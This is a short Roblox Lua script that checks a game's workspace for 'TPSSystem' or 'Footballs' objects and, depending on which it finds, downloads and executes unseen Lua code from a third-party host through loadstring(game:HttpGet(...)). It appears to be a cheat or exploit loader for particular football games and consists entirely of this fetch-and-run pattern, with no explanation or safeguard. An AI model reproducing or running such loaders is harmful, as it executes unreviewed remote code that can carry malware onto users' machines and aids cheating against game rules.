local tpsSystem = workspace:FindFirstChild("TPSSystem")
local touchline = workspace:FindFirstChild("Footballs")

if tpsSystem then
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/91c586a4b6f4213e4c6d09abe9e6017212e31e853cc9649c5ce7ab4050bdb8fc/download"))()

elseif touchline then
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/c094b7dff13bc23dfdb364a5f905e41406a146df9ec3704f3c2575519f435542/download"))()
end
